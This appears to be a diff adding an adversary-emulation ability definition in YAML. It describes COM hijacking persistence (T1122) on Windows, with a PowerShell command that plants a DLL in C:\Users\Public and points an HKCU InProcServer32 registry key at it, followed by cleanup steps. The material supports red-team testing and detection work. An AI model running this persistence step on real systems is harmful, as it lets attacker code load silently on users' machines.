@@ -1,0 +1,44 @@
+- tactic: persistence
+  technique_name: 'Event Triggered Execution: Component Object Model Hijacking'
+  technique_id: T1122
+  name: Component Object Model Hijacking
+  description: COM Hijacking using DLL
+  executors:
+  - name: psh
+    platform: windows
+    command: 'mv .\TestCOMServer.dll C:\Users\Public;
+
+      New-Item HKCU:\Software\Classes\CLSID -Name "{35786D3C-B075-49b9-88DD-029876E11C01}";
+
+      New-Item "HKCU:\Software\Classes\CLSID\{35786D3C-B075-49b9-88DD-029876E11C01}"
+      -Name "InProcServer32";
+
+      Set-Item -Path "HKCU:\Software\Classes\CLSID\{35786D3C-B075-49b9-88DD-029876E11C01}\InProcServer32"
+      -Value "C:\Users\Public\TestCOMServer.dll";'
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - TestCOMServer.dll
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup:
+    - Remove-Item -Path "HKCU:\Software\Classes\CLSID\{35786D3C-B075-49b9-88DD-029876E11C01}\InProcServer32"
+      -Recurse
+    - Remove-Item -Path "HKCU:\Software\Classes\CLSID\{35786D3C-B075-49b9-88DD-029876E11C01}"
+      -Recurse
+    - Remove-Item -Path "C:\Users\Public\TestCOMServer.dll"
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 8f2f5143-3d14-4326-9264-28ba87919cf9
